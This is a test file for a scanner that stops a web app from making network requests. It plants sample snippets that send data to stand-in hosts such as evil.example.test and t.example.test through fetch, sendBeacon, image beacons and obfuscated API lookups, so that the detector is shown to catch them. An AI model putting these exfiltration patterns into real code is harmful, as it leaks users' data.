// Tests for tools/check-no-network.js: it must catch every planted way of reaching the network (and CSP-breaking
// inline code), must NOT flag the harmless look-alikes this codebase really contains (XML namespace strings, JSDoc
// import() types, the word "fetch" in comments and prose, links the user clicks), and the real src/ and site/ must
// come out clean. Planted files live in a throwaway temporary folder.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, symlinkSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { tmpdir } from 'node:os';
import { fileURLToPath } from 'node:url';
import { spawnSync } from 'node:child_process';
import { scanJs, scanHtml, scanCss, scanTree, lexJs, isRemoteRef, ALLOWED_NETWORK_FILES } from '../tools/check-no-network.js';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const CLI = join(ROOT, 'tools', 'check-no-network.js');

const js = (src, allowNetwork = false) => scanJs(src, { file: 'x.js', allowNetwork });
const rules = (found) => found.map((v) => v.rule);

/** Make a throwaway repository with the given files ({relative path: content}). */
function plant(files) {
  const root = mkdtempSync(join(tmpdir(), 'ft-nonet-'));
  for (const [rel, content] of Object.entries(files)) {
    const p = join(root, ...rel.split('/'));
    mkdirSync(dirname(p), { recursive: true });
    writeFileSync(p, content);
  }
  return root;
}

const GOOD_LICENSE = [
  "export const A = 'https://api.polar.sh/v1/customer-portal/license-keys/validate';",
  "export const B = 'https://api.gumroad.com/v2/licenses/verify';",
  'export async function check(key, f = globalThis.fetch) { return f(A, { method: "POST", body: key }); }',
  '',
].join('\n');

// ---------------------------------------------------------------------------------------------------------------
// JavaScript: what must be caught

test('every network API is caught, by name and by string lookup', () => {
  const cases = {
    "fetch('/x')": 'api:fetch',
    'const r = await window.fetch(u);': 'api:fetch',
    'new XMLHttpRequest()': 'api:XMLHttpRequest',
    "new WebSocket('wss://h.example.test')": 'api:WebSocket',
    "new EventSource('/events')": 'api:EventSource',
    "navigator.sendBeacon('/b', data)": 'api:sendBeacon',
    'new RTCPeerConnection()': 'api:RTCPeerConnection',
    "new WebTransport('https://h.example.test')": 'api:WebTransport',
    "self['fetch'](u)": 'api-string:fetch',
    'Reflect.get(globalThis, "XMLHttpRequest")': 'api-string:XMLHttpRequest',
    'const t = `${fetch}`;': 'api:fetch',
  };
  for (const [src, rule] of Object.entries(cases)) {
    assert.ok(rules(js(src)).includes(rule), `${src} -> ${rule}, got ${JSON.stringify(rules(js(src)))}`);
  }
});

test('remote or computed code loading is caught', () => {
  const cases = {
    "importScripts('https://cdn.example.test/x.js')": 'load:importScripts',
    'importScripts(url)': 'load-computed:importScripts',
    "await import('https://cdn.example.test/m.js')": 'load:import',
    "await import('//cdn.example.test/m.js')": 'load:import',
    'await import(name)': 'load-computed:import',
    'await import(`./${name}.js`)': 'load-computed:import',
    "import x from 'https://cdn.example.test/x.js';": 'import-remote',
    "export { y } from 'http://cdn.example.test/y.js';": 'import-remote',
    "import 'https://cdn.example.test/side.js';": 'import-remote',
    "new Worker('https://cdn.example.test/w.js')": 'load:new Worker',
    'new Worker(URL.createObjectURL(blob))': 'load-computed:new Worker',
    "new Worker('blob:https://x/1')": 'load:new Worker',
    "new SharedWorker('data:text/javascript,1')": 'load:new SharedWorker',
    "img.src = 'https://track.example.test/p.gif';": 'assign-remote',
    "el.setAttribute('src', 'https://cdn.example.test/a.png')": 'attr-remote',
    "el.style.background = 'url(https://cdn.example.test/bg.png)';": 'css-remote-in-js',
  };
  for (const [src, rule] of Object.entries(cases)) {
    assert.ok(rules(js(src)).includes(rule), `${src} -> ${rule}, got ${JSON.stringify(rules(js(src)))}`);
  }
});

// Bypasses found by the security audit (2026-10-06). Each of these slipped through before its rule was added.
test('audit: lookups by a built name, prefixed and newer network APIs are caught', () => {
  const cases = {
    'self[`fetch`](u)': 'api-string:fetch',
    "globalThis['fe' + 'tch'](u)": 'api-string:fetch',
    "navigator['send' + 'Beacon']('/b', d)": 'api-string:sendBeacon',
    "window[\"XMLHttp\" +\n  'Request']": 'api-string:XMLHttpRequest',
    "const k = 'Beacon'; navigator['send' + k](u, d)": 'api-computed',
    'globalThis[name](u)': 'api-computed',
    'Reflect.get(self, api)(u)': 'api-computed',
    'new webkitRTCPeerConnection()': 'api:webkitRTCPeerConnection',
    "fetchLater('/x', { method: 'POST', body: d })": 'api:fetchLater',
    "new WebSocketStream('wss://h.example.test')": 'api:WebSocketStream',
  };
  for (const [src, rule] of Object.entries(cases)) {
    assert.ok(rules(js(src)).includes(rule), `${src} -> ${rule}, got ${JSON.stringify(rules(js(src)))}`);
  }
});

test('audit: a computed URL put into a resource sink or a navigation is caught', () => {
  const cases = {
    'img.src = `https://t.example.test/p.gif?d=${data}`;': 'assign-computed',
    "img.src = base + '?d=' + data;": 'assign-computed',
    'new Image().src = u;': 'assign-computed',
    'a.ping = u;': 'assign-computed',
    "el.setAttribute('src', url)": 'attr-computed',
    'el.setAttribute("srcset", `${u} 2x`)': 'attr-computed',
    "new Audio('https://cdn.example.test/a.mp3')": 'load:new Audio',
    'new Audio(u)': 'load-computed:new Audio',
    "location.href = 'https://x.example.test/?d=' + data;": 'nav-computed',
    'location = u;': 'nav-computed',
    'window.location = `https://x.example.test/${d}`;': 'nav-computed',
    'document.location.href = u;': 'nav-computed',
    'top.location.replace(u)': 'nav-computed',
    'location.assign(u)': 'nav-computed',
    'window.open(u)': 'nav-computed',
    "self.open('https://x.example.test/?d=' + d)": 'nav-computed',
    "document.createElement('script')": 'load-element',
    "document.createElement('IFRAME')": 'load-element',
    "document.createElement(\"link\")": 'load-element',
  };
  for (const [src, rule] of Object.entries(cases)) {
    assert.ok(rules(js(src)).includes(rule), `${src} -> ${rule}, got ${JSON.stringify(rules(js(src)))}`);
  }
});

test('audit: eval, string timers and HTML sinks are caught', () => {
  const cases = {
    'eval(code)': 'eval',
    'globalThis.eval(code)': 'eval',
    "new Function('return 1')": 'eval',
    "Function('a', 'return a')(1)": 'eval',
    "setTimeout('tick()', 10)": 'string-timer',
    'setInterval(`tick()`, 10)': 'string-timer',
    "el.innerHTML = '<img src=\"https://t.example.test/p.gif\">';": 'dom-sink:innerHTML',
    'el.outerHTML = s;': 'dom-sink:outerHTML',
    "el.insertAdjacentHTML('beforeend', s)": 'dom-sink:insertAdjacentHTML',
    'document.write(s)': 'dom-sink:document.write',
    'document.writeln(s)': 'dom-sink:document.write',
    'frame.srcdoc = s;': 'dom-sink:srcdoc',
    'range.createContextualFragment(s)': 'dom-sink:createContextualFragment',
    'el.setHTMLUnsafe(s)': 'dom-sink:setHTMLUnsafe',
    "const t = '<img src=\"https://t.example.test/p.gif\" alt=\"\">';": 'html-remote-in-js',
    "el.style.background = 'image-set(\"https://cdn.example.test/a.png\" 1x)';": 'css-remote-in-js',
    "const css = '@import\"https://fonts.example.test/x.css\";';": 'css-remote-in-js',
  };
  for (const [src, rule] of Object.entries(cases)) {
    assert.ok(rules(js(src)).includes(rule), `${src} -> ${rule}, got ${JSON.stringify(rules(js(src)))}`);
  }
  for (const v of js('eval(code)').concat(js("setTimeout('x()', 1)"))) assert.equal(v.kind, 'csp-inline', v.rule);
});

test('audit: the new rules leave the patterns this codebase really uses alone', () => {
  const clean = [
    'const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));',
    'setTimeout(() => setText(label, "Copy"), 2400);',
    'setTimeout(run, 120);',
    'void controller.open(input);',
    "const zip = await openZip(file); const handle = await fs.open(p, 'r');",
    'el.setAttribute(name, str);',
    "area.setAttribute('readonly', '');",
    "step.setAttribute('aria-current', 'step');",
    "const el = document.createElement(tag); const i = document.createElement('input');",
    "document.createElement('textarea'); document.createElement('a');",
    'downloadAgain.href = objectUrl;',
    'buyLink.href = sale.checkoutUrl;',
    'self.postMessage(message);',
    "const f = 'fe' + 'ature'; const label = 'Not ' + 'converted';",
    'el.textContent = name; el.className = cls;',
    "const msg = 'Text goes in as text, never as innerHTML or eval.';",
    '// never el.innerHTML = name; never eval(code)',
    "const ns = 'xmlns=\"http://www.topografix.com/GPX/1/1\"';",
    "location.hash = '#top'; const here = location.pathname;",
    "const ok = typeof Function === 'function';",
    "img.src = './assets/a.png'; img.src = `/assets/${'b'}.png`;",
  ];
  for (const src of clean) assert.deepEqual(js(src), [], src);
});

test('audit: CSS @import without a space, image-set() strings and escaped URLs are caught', () => {
  const css = `@import"https://fonts.example.test/a.css";
@import'//fonts.example.test/b.css';
.a { background: image-set("https://cdn.example.test/a.png" 1x) }
.b { background: -webkit-image-set('https://cdn.example.test/b.png' 1x) }
.c { background: url(h\\74tps://cdn.example.test/c.png) }
.d { background: url("\\68 ttps://cdn.example.test/d.png") }
@\\69mport url(https://fonts.example.test/e.css);
.e { content: "see https://example.test" }
.f { background: image-set("/assets/f.png" 1x, "data:image/png;base64,AA" 2x) }
`;
  const found = scanCss(css, { file: 'site/a.css' });
  assert.deepEqual(found.map((v) => `${v.line}:${v.rule}`), ['1:css-import', '2:css-import', '3:css-url', '4:css-url', '5:css-url', '6:css-url', '7:css-import']);
});

test('a URL that cannot parse is never requested (the module-worker feature test)', () => {
  assert.deepEqual(js("try { new Worker('http://[', options); } catch (e) {}"), []);
  assert.ok(rules(js("new Worker('http://cdn.example.test/w.js', options)")).includes('load:new Worker'));
});

test('a one-argument loader helper is accepted only when every call passes a local literal', () => {
  const helper = "function optional(path) {\n  return import(path).then((m) => m, () => null);\n}\n";
  assert.deepEqual(js(`${helper}Promise.all([optional('../config.js'), optional('./license.js')]);`), []);
  assert.deepEqual(js("const load = (u) => import(u);\nload('./a.js');\nload('/js/app/b.js');"), []);
  assert.deepEqual(js("const load = async function (u) { return import(u); };\nload('./a.js');"), []);
  assert.ok(rules(js(`${helper}optional('https://cdn.example.test/x.js');`)).includes('load:import'), 'remote call site');
  assert.ok(rules(js(`${helper}optional('./a.js'); optional(name);`)).includes('load-computed:import'), 'computed call site');
  assert.ok(rules(js(`${helper}optional('./a.js'); list.map(optional);`)).includes('load-computed:import'), 'passed as a value');
  assert.ok(rules(js(`${helper}`)).includes('load-computed:import'), 'never called: cannot be shown local');
  assert.ok(rules(js('function two(a, b) { return import(b); }\ntwo(1, "./a.js");')).includes('load-computed:import'),
    'only single-parameter helpers are followed');
});

test('the licence module may use fetch, but only toward the two payment-provider origins', () => {
  assert.deepEqual(js(GOOD_LICENSE, true), []);
  const bad = [
    "const U = 'https://evil.example.test/collect';",
    "const U = 'https://api.polar.sh.evil.example.test/x';",
    "const U = 'http://api.polar.sh/v1/x';",
    "const U = 'https://api.gumroad.com@evil.example.test/x';",
    'const U = `https://${host}/v1`;',
    "const U = '//evil.example.test/x';",
  ];
  for (const line of bad) {
    assert.ok(js(`${line}\n${GOOD_LICENSE}`, true).some((v) => v.rule.startsWith('license-url')), line);
  }
  // still no other network API there
  assert.ok(rules(js(`${GOOD_LICENSE}new WebSocket('wss://api.polar.sh/x');`, true)).includes('api:WebSocket'));
});

// ---------------------------------------------------------------------------------------------------------------
// JavaScript: what must NOT be caught (real patterns from this codebase)

test('harmless look-alikes are not flagged', () => {
  const clean = [
    "export const GPX_NS = 'http://www.topografix.com/GPX/1/1';",
    "const ns = `xmlns=\"${GPX_NS}\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"`;",
    "/** @typedef {import('../model.js').Item} Item */",
    '// the worker never calls fetch, XMLHttpRequest or WebSocket',
    '/* fetch( is mentioned in a block comment */',
    "const msg = 'We never fetch or upload anything.';",
    "const re = /[\\\\/:*?\"<>|]/g; const q = \"fetched\".length;",
    "const s = 'a' / 2; const t = s / 3 / 4;",
    "const w = new Worker(new URL('./worker.js', import.meta.url), { type: 'module' });",
    "const w = new Worker('/js/app/worker.js', { type: 'module' });",
    "const WORKER_URL = '/js/app/worker.js';\nconst w = new Worker(WORKER_URL, { type: 'module' });",
    "const m = await import('./lazy.js');",
    "import { a } from '../model.js';\nexport * from './b.js';",
    "link.href = 'https://checkout.example.test/buy';",
    "location.assign('https://checkout.example.test/buy');",
    'const prefetched = x.prefetchCount; const myfetch = 1;',
    "const t = `plain ${'fetching' + 1} text`;",
  ];
  for (const src of clean) assert.deepEqual(js(src), [], src);
});

test('the lexer keeps line numbers and survives unterminated strings, comments and templates', () => {
  const { code, literals } = lexJs("a\n'x\nfetch()\n/* never closed");
  assert.equal(code.split('\n').length, 4);
  assert.equal(literals.length, 1);
  const found = js("const a = 1;\n\n// c\nfetch('/x');\n");
  assert.equal(found[0].line, 4);
  for (const src of ['`unterminated ${', '`a ${ `b ${ c } d` } e`', "'", '/', '/[', '#!/usr/bin/env node\nfetch()']) {
    assert.doesNotThrow(() => js(src), src);
  }
  assert.ok(rules(js('#!/usr/bin/env node\nfetch()')).includes('api:fetch'));
  assert.ok(rules(js('const t = `a ${ `b ${ fetch(u) } d` } e`;')).includes('api:fetch'), 'code nested inside templates is scanned');
});

test('isRemoteRef recognises every way of naming another host', () => {
  for (const v of ['https://x.test/', 'http://x.test', 'HTTPS://X.TEST', '//x.test/a', '  https://x.test', 'wss://x.test',
    'https&#58;//x.test', 'https&colon;//x.test', '\\\\x.test\\a', '/\\x.test']) {
    assert.equal(isRemoteRef(v), true, v);
  }
  for (const v of ['/js/app/main.js', './a.css', 'a.png', '#top', 'data:image/png;base64,AA', 'mailto:help@example.test', '?q=1']) {
    assert.equal(isRemoteRef(v), false, v);
  }
});

// ---------------------------------------------------------------------------------------------------------------
// HTML and CSS

test('HTML: remote resources and CSP-breaking inline code are caught', () => {
  const html = `<!doctype html>
<html><head>
<script src="https://cdn.example.test/lib.js"></script>
<link rel="stylesheet" href="//fonts.example.test/css">
<link rel="preconnect" href="https://cdn.example.test">
<style>body { background: url(https://cdn.example.test/bg.png) }</style>
<meta http-equiv="refresh" content="0; url=https://elsewhere.example.test/">
<base href="https://elsewhere.example.test/">
</head><body style="margin:0">
<img src="http://cdn.example.test/a.png" alt="">
<img srcset="a.png 1x, https://cdn.example.test/a2.png 2x" alt="">
<iframe src="https://elsewhere.example.test/"></iframe>
<form action="https://collect.example.test/"><button formaction="https://collect.example.test/b">x</button></form>
<a href="/x" ping="https://track.example.test/">x</a>
<button onclick="go()">Go</button>
<a href="javascript:void(0)">x</a>
<video poster="https://cdn.example.test/p.jpg"></video>
<svg><image href="https://cdn.example.test/i.png"/><use xlink:href="https://cdn.example.test/s.svg#a"/></svg>
<script>fetch('/x')</script>
<script type="module">import('https://cdn.example.test/m.js')</script>
</body></html>`;
  const found = rules(scanHtml(html, { file: 'site/index.html' }));
  for (const r of ['attr:src', 'href:link', 'style-element', 'css-url', 'meta-refresh', 'href:base', 'style-attr', 'attr:srcset',
    'attr:action', 'attr:formaction', 'ping', 'event-attr', 'javascript-url', 'attr:poster', 'href:image', 'href:use',
    'inline-script', 'api:fetch', 'load:import']) {
    assert.ok(found.includes(r), `missing ${r}; got ${JSON.stringify(found)}`);
  }
  assert.equal(found.filter((r) => r === 'href:link').length, 2, 'stylesheet and preconnect');
  const line = scanHtml(html, { file: 'site/index.html' }).find((v) => v.rule === 'api:fetch')?.line;
  assert.equal(line, 19, 'inline script findings point at the right line');
});

test('HTML: the page a careful UI would write passes', () => {
  const html = `<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<!-- a comment with <script src="https://cdn.example.test/x.js"></script> and style="x" -->
<link rel="stylesheet" href="/assets/site.css">
<link rel="icon" href="/assets/icon.svg">
<link rel="canonical" href="https://foldertrail.example.test/">
<script type="module" src="/js/app/main.js"></script>
<script type="application/json" id="data">{"url": "https://x.test"}</script>
</head><body>
<a class="buy" href="https://checkout.example.test/l/ft" rel="noopener">Buy</a>
<a href="mailto:help@example.test">Email</a>
<img src="/assets/shot.png" alt="" srcset="/assets/shot.png 1x, /assets/shot@2x.png 2x">
<img src="data:image/png;base64,AAAA" alt="">
<svg xmlns="http://www.w3.org/2000/svg"><use href="#icon"/></svg>
<p>Your files stay here; we never fetch or upload them. See http://example.test for nothing.</p>
</body></html>`;
  assert.deepEqual(scanHtml(html, { file: 'site/index.html' }), []);
});

test('CSS: remote url() and @import are caught; local and data: are not', () => {
  const css = `/* url(https://cdn.example.test/commented.png) */
@import url("https://fonts.example.test/css");
@import '//fonts.example.test/b.css';
.a { background: url( 'https://cdn.example.test/bg.png' ) }
.b { background: url(/assets/local.png) }
.c { background: url("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'/>") }
@font-face { src: url(https://fonts.example.test/f.woff2) }
`;
  const found = scanCss(css, { file: 'site/a.css' });
  assert.deepEqual(found.map((v) => `${v.line}:${v.rule}`), ['2:css-import', '3:css-import', '4:css-url', '7:css-url']);
});

// ---------------------------------------------------------------------------------------------------------------
// The tree scan and the command line

test('scanTree: only src/app/license.js may fetch (or a byte-identical copy of it); every planted file is caught', () => {
  const root = plant({
    'src/app/license.js': GOOD_LICENSE,
    'src/app/worker.js': "// no fetch here\nexport const x = 1;\n",
    'src/app/leak.js': "export const go = (d) => fetch('/collect', { method: 'POST', body: d });\n",
    'src/format/beacon.js': "navigator.sendBeacon('/b', 'x');\n",
    'site/index.html': '<!doctype html><script type="module" src="/js/app/main.js"></script><img src="https://t.example.test/p.gif" alt="">\n',
    'site/assets/site.css': '@import url(https://fonts.example.test/x.css);\n',
    'site/js/app/license.js': GOOD_LICENSE,
    'site/notes.txt': 'fetch() in a text file is not code\n',
    'tools/ignored.js': "fetch('/not-scanned')\n",
  });
  try {
    const { violations, files } = scanTree(root);
    const byFile = (f) => violations.filter((v) => v.file === f).map((v) => v.rule);
    assert.deepEqual(byFile('src/app/license.js'), []);
    assert.deepEqual(byFile('site/js/app/license.js'), [], 'a byte-identical copy of the licence module');
    assert.deepEqual(byFile('src/app/worker.js'), []);
    assert.deepEqual(byFile('src/app/leak.js'), ['api:fetch']);
    assert.deepEqual(byFile('src/format/beacon.js'), ['api:sendBeacon']);
    assert.deepEqual(byFile('site/index.html'), ['attr:src']);
    assert.deepEqual(byFile('site/assets/site.css'), ['css-import']);
    assert.ok(!files.includes('site/notes.txt') && !files.some((f) => f.startsWith('tools/')));
    assert.deepEqual(ALLOWED_NETWORK_FILES, ['src/app/license.js']);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('scanTree: a modified copy of the licence module is not allowed to fetch', () => {
  const root = plant({
    'src/app/license.js': GOOD_LICENSE,
    'site/js/app/license.js': `${GOOD_LICENSE}// changed\n`,
  });
  try {
    const { violations } = scanTree(root);
    assert.ok(violations.some((v) => v.file === 'site/js/app/license.js' && v.rule === 'api:fetch'));
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('scanTree: symbolic-link loops and links into src/ are scanned once and never hang', (t) => {
  const root = plant({ 'src/app/license.js': GOOD_LICENSE, 'src/a.js': "fetch('/x')\n", 'site/index.html': '<p>x</p>\n' });
  try {
    try {
      symlinkSync(join(root, 'src'), join(root, 'site', 'js'), 'dir');
      symlinkSync(join(root, 'site'), join(root, 'site', 'loop'), 'dir');
    } catch {
      t.skip('this system does not allow symbolic links here');
      return;
    }
    const { violations } = scanTree(root);
    assert.equal(violations.filter((v) => v.rule === 'api:fetch').length, 1, 'src/a.js is reported once');
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test('command line: exit 1 with one line per problem; exit 0 and a plain sentence when clean', () => {
  const dirty = plant({ 'src/app/license.js': GOOD_LICENSE, 'src/a.js': "fetch('/x')\n" });
  const clean = plant({ 'src/app/license.js': GOOD_LICENSE, 'site/index.html': '<p>ok</p>\n' });
  try {
    const bad = spawnSync(process.execPath, [CLI, '--root', dirty], { encoding: 'utf8', timeout: 30_000 });
    assert.equal(bad.status, 1);
    assert.match(bad.stdout, /^src\/a\.js:1 {2}\[network\] fetch is a network API/m);
    const json = spawnSync(process.execPath, [CLI, '--root', dirty, '--json'], { encoding: 'utf8', timeout: 30_000 });
    assert.equal(json.status, 1);
    assert.equal(JSON.parse(json.stdout).violations[0].rule, 'api:fetch');
    const ok = spawnSync(process.execPath, [CLI, '--root', clean], { encoding: 'utf8', timeout: 30_000 });
    assert.equal(ok.status, 0);
    assert.match(ok.stdout, /^check-no-network: OK\./);
    const usage = spawnSync(process.execPath, [CLI, '--bogus'], { encoding: 'utf8', timeout: 30_000 });
    assert.equal(usage.status, 2);
  } finally {
    rmSync(dirty, { recursive: true, force: true });
    rmSync(clean, { recursive: true, force: true });
  }
});

test('the real src/ and site/ make no network request outside the licence module', () => {
  const { violations, files } = scanTree(ROOT);
  assert.ok(files.includes('src/app/license.js'), 'the licence module is among the scanned files');
  assert.deepEqual(violations, [], violations.map((v) => `${v.file}:${v.line} ${v.message}`).join('\n'));
});
